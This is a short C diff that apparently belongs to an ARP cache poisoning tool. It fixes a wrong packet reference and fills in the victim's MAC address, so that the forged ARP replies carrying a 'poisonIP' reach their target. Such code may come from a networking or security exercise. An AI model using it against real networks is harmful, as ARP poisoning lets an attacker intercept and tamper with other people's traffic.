@@ -30,7 +30,7 @@ void initPackets(socket_aux *socketInfo)
     arpRepPacket.cooked_data.payload.arp.hlen       = 6;	            //Hardware Length: MAC address length (6 bytes)
     arpRepPacket.cooked_data.payload.arp.plen       = 4;	            //Protocol Length: Length (in octets) of IPV4 address field (4 bytes)
     arpRepPacket.cooked_data.payload.arp.operation  = htons(2);	        //Operation: 1 for Request; 2 for reply
-    memcpy(arpReqPacket.cooked_data.payload.arp.src_hwaddr, socketInfo->this_mac, ETH_ALEN);
+    memcpy(arpRepPacket.cooked_data.payload.arp.src_hwaddr, socketInfo->this_mac, ETH_ALEN);
 
     // Ethernet Header (victim MAC will be filled in sendARPReplyPacket function)
     arpRepPacket.cooked_data.ethernet.eth_type = htons(ETH_P_ARP);
@@ -112,6 +112,10 @@ ssize_t sendARPReplyPacket(socket_aux *socketInfo, uint8_t *targetIP, uint8_t *t
 {
     ssize_t result;
 
+    //Set Link layer data
+    memcpy(arpRepPacket.cooked_data.ethernet.dst_addr, targetMAC, ETH_ALEN);
+
+    //Set ARP application data
     memcpy(arpRepPacket.cooked_data.payload.arp.src_paddr, poisonIP, IPV4_LEN);
     memcpy(arpRepPacket.cooked_data.payload.arp.tgt_hwaddr, targetMAC, ETH_ALEN);
     memcpy(arpRepPacket.cooked_data.payload.arp.tgt_paddr, targetIP, IPV4_LEN);
